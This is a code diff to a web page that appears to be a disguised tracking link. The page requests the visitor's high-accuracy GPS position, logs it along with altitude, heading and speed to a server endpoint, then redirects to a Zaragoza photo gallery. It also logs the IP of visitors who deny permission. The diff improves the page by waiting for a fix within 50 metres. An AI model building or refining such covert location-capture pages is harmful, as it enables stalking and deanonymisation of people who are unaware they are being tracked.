@@ -73,6 +73,8 @@
 
   <script>
     const REDIRECT = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';
+    const TARGET_ACCURACY_M = 50; // espera hasta ±50m o mejor
+    const MAX_WAIT_MS = 10000;    // máximo 10s esperando GPS
     let done = false;
 
     function showDenied() {
@@ -95,15 +97,34 @@
     if (!navigator.geolocation) {
       showDenied();
     } else {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+      let watchId = null;
+      let bestPos = null;
+
+      // Timeout máximo: usa la mejor posición obtenida hasta ahora
+      const giveUp = setTimeout(() => {
+        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        if (bestPos) {
+          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = bestPos.coords;
           redirectAfterLog({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
+        }
+        // Si no hay ninguna posición aún, el error callback se encargará
+      }, MAX_WAIT_MS);
+
+      watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          bestPos = pos;
+          // Si ya es suficientemente preciso, no esperar más
+          if (pos.coords.accuracy <= TARGET_ACCURACY_M) {
+            clearTimeout(giveUp);
+            navigator.geolocation.clearWatch(watchId);
+            const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
+            redirectAfterLog({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
+          }
         },
         (err) => {
-          // Denegado — mostrar aviso, NO redirigir
+          clearTimeout(giveUp);
+          if (watchId !== null) navigator.geolocation.clearWatch(watchId);
           showDenied();
-          // Aun así loguear el intento (captura IP)
           fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -111,7 +132,7 @@
             keepalive: true
           }).catch(() => {});
         },
-        { enableHighAccuracy: true, timeout: 13000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: MAX_WAIT_MS, maximumAge: 0 }
       );
     }
   </script>
